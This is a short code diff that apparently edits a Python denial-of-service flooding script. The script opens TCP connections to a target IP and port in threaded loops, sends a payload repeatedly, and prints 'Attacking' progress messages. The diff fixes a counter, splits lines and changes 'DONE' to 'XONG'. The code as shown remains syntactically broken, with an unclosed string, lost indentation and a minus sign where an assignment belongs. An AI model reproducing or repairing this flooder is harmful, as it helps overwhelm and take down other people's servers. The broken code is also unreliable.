@@ -37,12 +37,15 @@ bb = int(0)
 while True: 
 try: 
 h = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-h.connect((ip, port)) h.send(hevin) for i in range(packet):
+h.connect((ip,port)) 
 h.send(hevin)
-bb + 1
-print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), except KeyboardInterrupt:
+for i in range(packet):
+h.send(hevin)
+bb += 1
+print(colored('[+] Attacking '+ip +">>>Sent: +str(bb), 
+except KeyboardInterrupt:
 h.close()
-print(colored("[+++] DONE !!!!", "green")) 
+print(colored("[+++] XONG !!!!", 'green')) 
 pass
 for b in range(thread):
 thread - threading.Thread(target=syn)
